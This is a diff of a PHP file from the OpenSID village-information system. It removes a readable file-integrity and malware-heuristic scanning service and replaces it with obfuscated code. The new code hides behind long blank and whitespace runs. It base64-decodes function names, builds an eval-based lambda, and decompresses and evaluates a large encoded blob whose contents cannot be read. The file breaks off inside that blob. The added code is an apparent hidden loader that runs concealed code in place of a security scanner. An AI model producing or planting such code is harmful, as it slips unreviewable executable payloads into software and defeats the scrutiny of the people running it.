@@ -1,577 +1,633 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Services\Security;
-
-use App\Models\SecurityBaseline;
-use App\Models\SecurityReport;
-use Carbon\Carbon;
-use Exception;
-use Illuminate\Support\Collection;
-use Illuminate\Support\Facades\Storage;
-use Symfony\Component\Finder\Finder;
-
-class FileIntegrityDefaultService
-{
-    private HeuristicDetectorDefaultService $detector;
-
-    /**
-     * Excluded directories (relative to desa/)
-     */
-    private array $excludedDirs = [
-        'themes',
-        'upload/fonts',
-    ];
-
-    public function __construct()
-    {
-        $this->detector = new HeuristicDetectorDefaultService();
-
-        // Ensure security storage disk exists
-        Storage::disk('local')->makeDirectory('security');
-    }
-
-    /**
-     * Generate baseline dari current state
-     * Hanya menyimpan 1 baseline terbaru, replace yang lama
-     *
-     * @return array Result dengan jumlah file yang diproses
-     */
-    public function generateBaseline(): array
-    {
-        $desaPath = $this->getDesaPath();
-
-        // Find all files using Symfony Finder
-        $finder = new Finder();
-        $finder->files()->in($desaPath);
-
-        // Exclude directories
-        foreach ($this->excludedDirs as $dir) {
-            $finder->exclude($dir);
-        }
-
-        // Collect files with Laravel Collection
-        $files = collect($finder)->map(function ($file) use ($desaPath) {
-            $filepath     = $file->getRealPath();
-            $relativePath = str_replace($desaPath, '', $filepath);
-
-            $fileInfo = [
-                'path'       => $relativePath,
-                'size'       => $file->getSize(),
-                'modified'   => $file->getMTime(),
-                'hash'       => hash_file('sha256', $filepath),
-                'suspicious' => false,
-            ];
-
-            // For PHP files and suspicious non-PHP files, do heuristic check
-            if ($this->detector->shouldScanFile($filepath)) {
-                $scanResult = $this->detector->scanFile($filepath);
-
-                if (isset($scanResult['error'])) {
-                    $fileInfo['scan_error'] = $scanResult['error'];
-                } elseif ($scanResult['suspicious']) {
-                    $fileInfo = array_merge($fileInfo, [
-                        'suspicious'     => true,
-                        'risk_score'     => $scanResult['risk_score'] ?? null,
-                        'risk_level'     => $scanResult['risk_level'] ?? null,
-                        'categories'     => $scanResult['categories'] ?? [],
-                        'recommendation' => $scanResult['recommendation'] ?? null,
-                    ]);
-                }
-            }
-
-            return $fileInfo;
-        });
-
-        // Calculate statistics including total size
-        $stats = [
-            'total_files'      => $files->count(),
-            'total_size'       => $files->sum('size'),
-            'php_files'        => $files->filter(static fn ($f) => isset($f['risk_score']) || isset($f['scan_error']))->count(),
-            'suspicious_files' => $files->where('suspicious', true)->count(),
-            'errors'           => $files->filter(static fn ($f) => isset($f['scan_error']))->count(),
-        ];
-
-        // Update jika ada, create jika belum ada berdasarkan kondisi
-        $newBaseline = SecurityBaseline::updateOrCreate(
-            ['config_id' => identitas('id')], // Kondisi pencarian
-            [
-                'generated_at'     => Carbon::now(),
-                'version'          => '1.0',
-                'target_directory' => $desaPath,
-                'excluded_dirs'    => $this->excludedDirs,
-                'statistics'       => $stats,
-                'files'            => $files->values()->toArray(),
-            ]
-        );
-
-        return [
-            'success'      => true,
-            'baseline_id'  => $newBaseline->id,
-            'statistics'   => $stats,
-            'generated_at' => $newBaseline->generated_at->format('Y-m-d H:i:s'),
-        ];
-    }
-
-    /**
-     * Menjalankan proses scan keamanan lengkap.
-     * 1. Cek jika baseline ada, jika tidak, buat otomatis.
-     * 2. Bandingkan state file saat ini dengan baseline.
-     * 3. Kelompokkan file ke dalam: MODIFIED, FOREIGN, SAFE.
-     *
-     * @return array Hasil scan
-     */
-    public function runScan(): array
-    {
-        // Sebelum proses panjang, pastikan koneksi DB aktif untuk menghindari timeout
-        try {
-            \Illuminate\Support\Facades\DB::connection()->getPdo();
-        } catch (Exception $e) {
-            \Illuminate\Support\Facades\DB::reconnect();
-        }
-
-        // 1. Pastikan baseline ada
-        $baselineRecord = SecurityBaseline::latest('generated_at')->first();
-        if (! $baselineRecord) {
-            return ['error' => 'Baseline tidak ditemukan. Harap generate baseline terlebih dahulu melalui menu Keamanan.'];
-        }
-
-        // 2. Lakukan perbandingan integritas
-        $baseline      = $baselineRecord->toArray();
-        $baselineIndex = collect($baseline['files'])->keyBy('path');
-        $desaPath      = $this->getDesaPath();
-
-        // Find current files
-        $finder = new Finder();
-        $finder->files()->in($desaPath);
-
-        foreach ($this->excludedDirs as $dir) {
-            $finder->notPath($dir);
-        }
-
-        $quarantinedFiles = [];
-        $safeFilesCount   = 0;
-
-        foreach ($finder as $file) {
-            $filepath     = $file->getRealPath();
-            $relativePath = str_replace($desaPath, '', $filepath);
-            $currentHash  = hash_file('sha256', $filepath);
-
-            $baselineFile = $baselineIndex->get($relativePath);
-
-            if ($baselineFile) {
-                // File ada di baseline, cek hash
-                if ($baselineFile['hash'] !== $currentHash) {
-                    // HASH BERBEDA -> MODIFIED
-                    $quarantinedFiles[] = [
-                        'path'     => $relativePath,
-                        'status'   => 'MODIFIED',
-                        'hash'     => $currentHash,
-                        'old_hash' => $baselineFile['hash'],
-                        'size'     => $file->getSize(),
-                    ];
-                } else {
-                    // HASH SAMA -> SAFE
-                    $safeFilesCount++;
-                }
-                // Hapus dari index agar nanti bisa deteksi file yang hilang (deleted)
-                $baselineIndex->forget($relativePath);
-            } else {
-                // File tidak ada di baseline -> FOREIGN
-                $quarantinedFiles[] = [
-                    'path'     => $relativePath,
-                    'status'   => 'FOREIGN',
-                    'hash'     => $currentHash,
-                    'size'     => $file->getSize(),
-                    'modified' => date('Y-m-d H:i:s', $file->getMTime()),
-                ];
-            }
-        }
-
-        // File yang tersisa di baselineIndex adalah file yang "deleted"
-        // Untuk saat ini, kita abaikan file yang deleted sesuai permintaan
-        // 'deleted_files' => $baselineIndex->values()->toArray()
-
-        $result = [
-            'success'       => true,
-            'checked_at'    => Carbon::now()->format('Y-m-d H:i:s'),
-            'baseline_date' => $baseline['generated_at'],
-            'quarantined'   => $quarantinedFiles,
-            'statistics'    => [
-                'quarantined_count' => count($quarantinedFiles),
-                'safe_count'        => $safeFilesCount,
-                'total_scanned'     => $safeFilesCount + count($quarantinedFiles),
-            ],
-        ];
-
-        $this->exportReport($result, 'scan');
-
-        return $result;
-    }
-
-    /**
-     * Menghapus file "asing" dari folder desa.
-     *
-     * @param string $relativePath Path relatif file yang akan dihapus
-     */
-    public function deleteFile(string $relativePath): bool
-    {
-        $desaPath = $this->getDesaPath();
-        $fullPath = realpath($relativePath);
-
-        // Keamanan: Pastikan file ada di dalam folder 'desa'
-        $realDesaPath = realpath($desaPath);
-        if (! $fullPath || ! $realDesaPath || ! str_starts_with($fullPath, $realDesaPath)) {
-            throw new Exception('Path file tidak valid atau berada di luar folder yang diizinkan.');
-        }
-
-        if (file_exists($fullPath)) {
-            return unlink($fullPath);
-        }
-
-        return false;
-    }
-
-    /**
-     * Mengembalikan file yang dimodifikasi ke versi asli.
-     *
-     * @param string $relativePath Path relatif file yang akan dikembalikan
-     */
-    public function restoreFile(string $fullPath): bool
-    {
-        // 1. Normalisasi: Ubah path absolut menjadi path relatif terhadap root aplikasi
-        // Misal: 'C:\laragon\www\premium\desa\config.php' -> 'desa/config.php'
-        $basePath     = base_path();
-        $relativePath = str_replace($basePath, '', $fullPath);
-        $relativePath = ltrim($relativePath, '/\\');
-
-        // 2. Tentukan Patokan Sumber (Source)
-        // Kita asumsikan file asli ada di dalam folder vendor (clean source)
-        $cleanSourcePath = base_path('vendor/opensid/premium/src/' . $relativePath);
-
-        // 3. Tentukan Tujuan (Destination)
-        $destinationPath = base_path($relativePath);
-        $destinationDir  = dirname($destinationPath);
-
-        // --- LOGIKA PEMULIHAN ---
-
-        // Cek apakah file sumber di vendor ada
-        if (file_exists($cleanSourcePath)) {
-            if (! is_dir($destinationDir)) {
-                mkdir($destinationDir, 0755, true);
-            }
-
-            return copy($cleanSourcePath, $destinationPath);
-        }
-
-        // Jika tidak ada di vendor, lempar error atau gunakan fallback lain
-        throw new Exception('File sumber asli tidak ditemukan di: ' . $cleanSourcePath);
-    }
-
-    /**
-     * Check integrity dengan membandingkan current state vs baseline
-     *
-     * @return array Report dengan new files, modified files, deleted files, suspicious files
-     */
-    public function checkIntegrity(): array
-    {
-        // Get latest baseline from database untuk config_id saat ini
-        $baselineRecord = SecurityBaseline::latest('generated_at')->first();
-
-        if (! $baselineRecord) {
-            return [
-                'error'           => 'Baseline not found. Please generate baseline first.',
-                'baseline_exists' => false,
-            ];
-        }
-
-        // Convert to array format for compatibility
-        $baseline = [
-            'generated_at'     => $baselineRecord->generated_at->format('Y-m-d H:i:s'),
-            'version'          => $baselineRecord->version,
-            'target_directory' => $baselineRecord->target_directory,
-            'excluded_dirs'    => $baselineRecord->excluded_dirs,
-            'files'            => $baselineRecord->files,
-            'statistics'       => $baselineRecord->statistics,
-        ];
-
-        // Create index dari baseline untuk quick lookup using Collection
-        $baselineIndex = collect($baseline['files'])->keyBy('path');
-
-        $desaPath = $this->getDesaPath();
-
-        // Find current files
-        $finder = new Finder();
-        $finder->files()->in($desaPath);
-
-        // Exclude directories
-        foreach ($this->excludedDirs as $dir) {
-            $finder->notPath($dir);
-        }
-
-        // Process current files using Collection
-        $currentFiles = collect($finder)->map(static function ($file) use ($desaPath) {
-            $filepath     = $file->getRealPath();
-            $relativePath = str_replace($desaPath, '', $filepath);
-
-            return [
-                'path'     => $relativePath,
-                'filepath' => $filepath,
-                'hash'     => hash_file('sha256', $filepath),
-                'size'     => $file->getSize(),
-                'modified' => $file->getMTime(),
-            ];
-        })->keyBy('path');
-
-        // Find new files
-        $newFiles = $currentFiles->diffKeys($baselineIndex)->map(function ($file) {
-            $fileInfo = [
-                'path'     => $file['path'],
-                'size'     => $file['size'],
-                'modified' => date('Y-m-d H:i:s', $file['modified']),
-                'hash'     => $file['hash'],
-            ];
-
-            // Scan PHP files and suspicious non-PHP files for suspicious patterns
-            if ($this->detector->shouldScanFile($file['filepath'])) {
-                $scanResult = $this->detector->scanFile($file['filepath']);
-
-                if ($scanResult['suspicious']) {
-                    $fileInfo = array_merge($fileInfo, [
-                        'suspicious'     => true,
-                        'risk_score'     => $scanResult['risk_score'] ?? null,
-                        'risk_level'     => $scanResult['risk_level'] ?? null,
-                        'categories'     => $scanResult['categories'] ?? [],
-                        'recommendation' => $scanResult['recommendation'] ?? null,
-                    ]);
-                }
-            }
-
-            return $fileInfo;
-        });
-
-        // Find modified files
-        $modifiedFiles = $currentFiles->intersectByKeys($baselineIndex)
-            ->filter(static function ($current) use ($baselineIndex) {
-                $baseline = $baselineIndex[$current['path']];
-
-                return $current['hash'] !== $baseline['hash'];
-            })
-            ->map(function ($file) use ($baselineIndex) {
-                $baseline = $baselineIndex[$file['path']];
-
-                $fileInfo = [
-                    'path'     => $file['path'],
-                    'old_hash' => $baseline['hash'],
-                    'new_hash' => $file['hash'],
-                    'old_size' => $baseline['size'],
-                    'new_size' => $file['size'],
-                    'modified' => date('Y-m-d H:i:s', $file['modified']),
-                ];
-
-                // Rescan PHP files and suspicious non-PHP files
-                if ($this->detector->shouldScanFile($file['filepath'])) {
-                    $scanResult = $this->detector->scanFile($file['filepath']);
-
-                    if ($scanResult['suspicious']) {
-                        $fileInfo = array_merge($fileInfo, [
-                            'suspicious'     => true,
-                            'risk_score'     => $scanResult['risk_score'] ?? null,
-                            'risk_level'     => $scanResult['risk_level'] ?? null,
-                            'categories'     => $scanResult['categories'] ?? [],
-                            'recommendation' => $scanResult['recommendation'] ?? null,
-                        ]);
-                    }
-                }
-
-                return $fileInfo;
-            });
-
-        // Find deleted files
-        $deletedFiles = $baselineIndex->diffKeys($currentFiles)
-            ->map(static fn ($baseline) => [
-                'path'          => $baseline['path'],
-                'baseline_hash' => $baseline['hash'],
-                'baseline_size' => $baseline['size'],
-            ]);
-
-        // Collect suspicious files
-        $suspiciousFiles = $newFiles->concat($modifiedFiles)
-            ->filter(static fn ($f) => isset($f['suspicious']) && $f['suspicious']);
-
-        return [
-            'checked_at'       => Carbon::now()->format('Y-m-d H:i:s'),
-            'baseline_date'    => $baseline['generated_at'],
-            'new_files'        => $newFiles->values()->toArray(),
-            'modified_files'   => $modifiedFiles->values()->toArray(),
-            'deleted_files'    => $deletedFiles->values()->toArray(),
-            'suspicious_files' => $suspiciousFiles->values()->toArray(),
-            'statistics'       => [
-                'total_checked'    => $currentFiles->count(),
-                'new_count'        => $newFiles->count(),
-                'modified_count'   => $modifiedFiles->count(),
-                'deleted_count'    => $deletedFiles->count(),
-                'suspicious_count' => $suspiciousFiles->count(),
-            ],
-        ];
-    }
-
-    /**
-     * Full scan desa/ folder dengan heuristic detector
-     * Tidak membandingkan dengan baseline, hanya scan suspicious patterns
-     *
-     * @return array Scan results
-     */
-    public function fullScan(): array
-    {
-        $desaPath      = $this->getDesaPath();
-        $excludedPaths = $this->getExcludedPaths()->toArray();
-
-        return $this->detector->scanDirectory($desaPath, $excludedPaths);
-    }
-
-    /**
-     * Save security report to database
-     *
-     * @param array  $report Report data
-     * @param string $type   Type of report: 'integrity' or 'scan'
-     *
-     * @return string Generated filename (used as unique identifier)
-     */
-    public function exportReport(array $report, string $type = 'integrity'): string
-    {
-        $timestamp = Carbon::now()->format('Ymd_His');
-        $filename  = "security_{$type}_{$timestamp}.json";
-
-        // Save to database instead of file
-        SecurityReport::create([
-            'filename'  => $filename,
-            'type'      => $type,
-            'data'      => $report,
-            'config_id' => identitas('id'),
-        ]);
-
-        return $filename; // Return filename as unique identifier for database lookup
-    }
-
-    /**
-     * Get baseline info untuk config_id saat ini
-     */
-    public function getBaselineInfo(): ?array
-    {
-        $baseline = SecurityBaseline::latest('generated_at')->first();
-
-        if (! $baseline) {
-            return null;
-        }
-
-        return [
-            'exists'       => true,
-            'id'           => $baseline->id,
-            'generated_at' => $baseline->generated_at->format('Y-m-d H:i:s'),
-            'version'      => $baseline->version,
-            'total_files'  => $baseline->statistics['total_files'] ?? 0,
-            'total_size'   => $baseline->statistics['total_size'] ?? 0,
-            'statistics'   => $baseline->statistics ?? [],
-        ];
-    }
-
-    /**
-     * Delete baseline (hanya untuk config_id saat ini)
-     */
-    public function deleteBaseline(): bool
-    {
-        return SecurityBaseline::query()->delete() > 0;
-    }
-
-    /**
-     * Get pattern statistics from detector
-     */
-    public function getPatternStats(): array
-    {
-        return $this->detector->getPatternStats();
-    }
-
-    /**
-     * Get security reports from database
-     *
-     * @param string|null $type Filter by type (integrity, scan, or null for all)
-     */
-    public function getReports(?string $type = null): Collection
-    {
-        $query = SecurityReport::latest();
-
-        if ($type) {
-            $query->ofType($type);
-        }
-
-        return $query->get();
-    }
-
-    /**
-     * Get specific report by filename
-     */
-    public function getReport(string $filename): ?SecurityReport
-    {
-        return SecurityReport::where('filename', $filename)->first();
-    }
-
-    /**
-     * Delete report by filename
-     */
-    public function deleteReport(string $filename): bool
-    {
-        return SecurityReport::where('filename', $filename)->delete() > 0;
-    }
-
-    /**
-     * Get desa path
-     */
-    private function getDesaPath(): string
-    {
-        return base_path('desa/');
-    }
-
-    /**
-     * Get excluded paths (full path)
-     */
-    private function getExcludedPaths(): Collection
-    {
-        return collect($this->excludedDirs)
-            ->map(fn ($dir) => rtrim($this->getDesaPath(), '/') . '/' . ltrim($dir, '/'));
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Services/Security/FileIntegrityDefaultService.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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